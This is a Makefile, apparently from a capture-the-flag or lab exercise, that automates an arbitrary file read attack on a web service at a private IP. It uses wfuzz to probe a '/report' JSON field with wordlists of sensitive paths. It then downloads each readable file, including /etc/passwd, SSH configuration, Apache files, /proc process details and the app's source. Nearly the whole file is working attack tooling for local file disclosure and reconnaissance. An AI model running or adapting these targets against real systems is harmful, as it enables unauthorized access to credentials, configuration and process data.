files = /dev/fb0 /etc/apache2/apache2.conf /etc/apache2/envvars /etc/apache2/ports.conf /etc/apt/sources.list /etc/crontab /etc/fstab /etc/group /etc/hosts /etc/hosts.allow /etc/hosts.deny /etc/init.d/apache2 /etc/issue /etc/motd /etc/mtab /etc/netconfig /etc/nsswitch.conf /etc/passwd /etc/resolv.conf /etc/rpc /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_ed25519_key.pub /etc/ssh/ssh_host_rsa_key.pub main.py /proc/cmdline /proc/cpuinfo /proc/interrupts /proc/loadavg /proc/meminfo /proc/mounts /proc/net/arp /proc/net/dev /proc/net/fib_trie /proc/net/route /proc/net/tcp /proc/net/udp /proc/partitions /proc/sched_debug /proc/self/arch_status /proc/self/attr/apparmor/current /proc/self/attr/current /proc/self/autogroup /proc/self/cgroup /proc/self/cmdline /proc/self/comm /proc/self/coredump_filter /proc/self/cpu_resctrl_groups /proc/self/cpuset /proc/self/exe /proc/self/gid_map /proc/self/limits /proc/self/loginuid /proc/self/maps /proc/self/mountinfo /proc/self/mounts /proc/self/net/anycast6 /proc/self/net/arp /proc/self/net/connector /proc/self/net/dev /proc/self/net/dev_mcast /proc/self/net/dev_snmp6/lo /proc/self/net/fib_trie /proc/self/net/fib_triestat /proc/self/net/hci /proc/self/net/icmp /proc/self/net/icmp6 /proc/self/net/if_inet6 /proc/self/net/igmp /proc/self/net/igmp6 /proc/self/net/ip6_flowlabel /proc/self/net/ip6_mr_cache /proc/self/net/ip6_mr_vif /proc/self/net/ip_mr_cache /proc/self/net/ip_mr_vif /proc/self/net/ipv6_route /proc/self/net/l2cap /proc/self/net/mcfilter /proc/self/net/mcfilter6 /proc/self/net/netfilter/nf_log /proc/self/net/netlink /proc/self/net/netstat /proc/self/net/packet /proc/self/net/protocols /proc/self/net/psched /proc/self/net/ptype /proc/self/net/raw /proc/self/net/raw6 /proc/self/net/route /proc/self/net/rt6_stats /proc/self/net/rt_acct /proc/self/net/rt_cache /proc/self/net/sco /proc/self/net/snmp /proc/self/net/snmp6 /proc/self/net/sockstat /proc/self/net/sockstat6 /proc/self/net/softnet_stat /proc/self/net/stat/arp_cache /proc/self/net/stat/ndisc_cache /proc/self/net/stat/rt_cache /proc/self/net/tcp /proc/self/net/tcp6 /proc/self/net/udp /proc/self/net/udp6 /proc/self/net/udplite /proc/self/net/udplite6 /proc/self/net/unix /proc/self/net/wireless /proc/self/numa_maps /proc/self/oom_adj /proc/self/oom_score /proc/self/oom_score_adj /proc/self/projid_map /proc/self/sched /proc/self/schedstat /proc/self/sessionid /proc/self/setgroups /proc/self/smaps /proc/self/smaps_rollup /proc/self/stat /proc/self/statm /proc/self/status /proc/self/timens_offsets /proc/self/timers /proc/self/uid_map /proc/self/wchan /proc/version robots.txt /sys/class/graphics/fb0/virtual_size /var/log/lastlog /var/log/wtmp /var/run/utmp /proc/102/cmdline /proc/103/cmdline /proc/104/cmdline /proc/105/cmdline /proc/106/cmdline /proc/108/cmdline /proc/109/cmdline /proc/10/cmdline /proc/10/gid_map /proc/10/loginuid /proc/10/net/arp /proc/10/stat /proc/10/statm /proc/10/status /proc/10/uid_map /proc/11/cmdline /proc/11/gid_map /proc/11/loginuid /proc/11/net/arp /proc/11/stat /proc/11/statm /proc/11/status /proc/11/uid_map /proc/12/cmdline /proc/12/gid_map /proc/12/loginuid /proc/12/net/arp /proc/12/stat /proc/12/statm /proc/12/status /proc/12/uid_map /proc/13/cmdline /proc/13/gid_map /proc/13/loginuid /proc/13/net/arp /proc/13/stat /proc/13/statm /proc/13/status /proc/13/uid_map /proc/144/cmdline /proc/145/cmdline /proc/15/cmdline /proc/15/gid_map /proc/15/loginuid /proc/15/net/arp /proc/15/stat /proc/15/statm /proc/15/status /proc/15/uid_map /proc/17/cmdline /proc/17/gid_map /proc/17/loginuid /proc/17/net/arp /proc/17/stat /proc/17/statm /proc/17/status /proc/17/uid_map /proc/18/cmdline /proc/18/gid_map /proc/18/loginuid /proc/18/net/arp /proc/18/stat /proc/18/statm /proc/18/status /proc/18/uid_map /proc/19/cmdline /proc/19/gid_map /proc/19/loginuid /proc/19/net/arp /proc/19/stat /proc/19/statm /proc/19/status /proc/19/uid_map /proc/1/cmdline /proc/1/gid_map /proc/1/loginuid /proc/1/net/arp /proc/1/stat /proc/1/statm /proc/1/status /proc/1/uid_map /proc/203/cmdline /proc/20/cmdline /proc/20/gid_map /proc/20/loginuid /proc/20/net/arp /proc/20/stat /proc/20/statm /proc/20/status /proc/20/uid_map /proc/21/cmdline /proc/21/gid_map /proc/21/loginuid /proc/21/net/arp /proc/21/stat /proc/21/statm /proc/21/status /proc/21/uid_map /proc/22/cmdline /proc/22/gid_map /proc/22/loginuid /proc/22/net/arp /proc/22/stat /proc/22/statm /proc/22/status /proc/22/uid_map /proc/23/cmdline /proc/23/gid_map /proc/23/loginuid /proc/23/net/arp /proc/23/stat /proc/23/statm /proc/23/status /proc/23/uid_map /proc/24/cmdline /proc/24/gid_map /proc/24/loginuid /proc/24/net/arp /proc/24/stat /proc/24/statm /proc/24/status /proc/24/uid_map /proc/251/cmdline /proc/25/cmdline /proc/25/gid_map /proc/25/loginuid /proc/25/net/arp /proc/25/stat /proc/25/statm /proc/25/status /proc/25/uid_map /proc/2/cmdline /proc/2/gid_map /proc/2/loginuid /proc/2/net/arp /proc/2/stat /proc/2/statm /proc/2/status /proc/2/uid_map /proc/311/cmdline /proc/334/cmdline /proc/336/cmdline /proc/376/cmdline /proc/3/cmdline /proc/3/gid_map /proc/3/loginuid /proc/3/net/arp /proc/3/stat /proc/3/statm /proc/3/status /proc/3/uid_map /proc/43/cmdline /proc/43/gid_map /proc/43/loginuid /proc/43/net/arp /proc/43/stat /proc/43/statm /proc/43/status /proc/43/uid_map /proc/44/cmdline /proc/44/gid_map /proc/44/loginuid /proc/44/net/arp /proc/44/stat /proc/44/statm /proc/44/status /proc/44/uid_map /proc/45/cmdline /proc/45/gid_map /proc/45/loginuid /proc/45/net/arp /proc/45/stat /proc/45/statm /proc/45/status /proc/45/uid_map /proc/46/cmdline /proc/46/gid_map /proc/46/loginuid /proc/46/net/arp /proc/46/stat /proc/46/statm /proc/46/status /proc/46/uid_map /proc/47/cmdline /proc/47/gid_map /proc/47/loginuid /proc/47/net/arp /proc/47/stat /proc/47/statm /proc/47/status /proc/47/uid_map /proc/48/cmdline /proc/48/gid_map /proc/48/loginuid /proc/48/net/arp /proc/48/stat /proc/48/statm /proc/48/status /proc/48/uid_map /proc/4/cmdline /proc/4/gid_map /proc/4/loginuid /proc/4/net/arp /proc/4/stat /proc/4/statm /proc/4/status /proc/4/uid_map /proc/51/cmdline /proc/51/gid_map /proc/51/loginuid /proc/51/net/arp /proc/51/stat /proc/51/statm /proc/51/status /proc/51/uid_map /proc/52/cmdline /proc/52/gid_map /proc/52/loginuid /proc/52/net/arp /proc/52/stat /proc/52/statm /proc/52/status /proc/52/uid_map /proc/53/cmdline /proc/53/gid_map /proc/53/loginuid /proc/53/net/arp /proc/53/stat /proc/53/statm /proc/53/status /proc/53/uid_map /proc/54/cmdline /proc/54/gid_map /proc/54/loginuid /proc/54/net/arp /proc/54/stat /proc/54/statm /proc/54/status /proc/54/uid_map /proc/64/cmdline /proc/64/gid_map /proc/64/loginuid /proc/64/net/arp /proc/64/stat /proc/64/statm /proc/64/status /proc/64/uid_map /proc/67/cmdline /proc/67/gid_map /proc/67/loginuid /proc/67/net/arp /proc/67/stat /proc/67/statm /proc/67/status /proc/67/uid_map /proc/68/cmdline /proc/68/gid_map /proc/68/loginuid /proc/68/net/arp /proc/68/stat /proc/68/statm /proc/68/status /proc/68/uid_map /proc/6/cmdline /proc/6/gid_map /proc/6/loginuid /proc/6/net/arp /proc/6/stat /proc/6/statm /proc/6/status /proc/6/uid_map /proc/8/cmdline /proc/8/gid_map /proc/8/loginuid /proc/8/net/arp /proc/8/stat /proc/8/statm /proc/8/status /proc/8/uid_map /proc/9/cmdline /proc/9/gid_map /proc/9/loginuid /proc/9/net/arp /proc/9/stat /proc/9/statm /proc/9/status /proc/9/uid_map
files: $(addprefix files/, $(files)) user

user: getInfo.sh
	bash getInfo.sh

files/%:
	mkdir -p $$(dirname files/$*)
	deno run --allow-all ./readFile.ts $* > files/$*

found_files.log.unsorted: interesting_files.txt
	 wfuzz -z file,interesting_files.txt --sc 200 -X POST -d '{"report":"FUZZ"}'  -H 'content-type: application/json' -o csv http://10.2.17.11:5000/report | stdbuf -oL cut -d',' -f6 | grep -v "^request$$" | tee found_files.log.unsorted

proc_files.log.unsorted: proc_files.txt
	 wfuzz -z file,proc_files.txt --sc 200 -X POST -d '{"report":"FUZZ"}'  -H 'content-type: application/json' -o csv http://10.2.17.11:5000/report | stdbuf -oL cut -d',' -f6 | grep -v "^request$$" | tee proc_files.log.unsorted


found_files.log: found_files.log.unsorted
	cat found_files.log.unsorted | sort | uniq | tee found_files.log

proc_files.log: proc_files.log.unsorted
	cat proc_files.log.unsorted | sort | uniq | tee proc_files.log

proc_files.txt: otherlist.sh
	bash otherlist.sh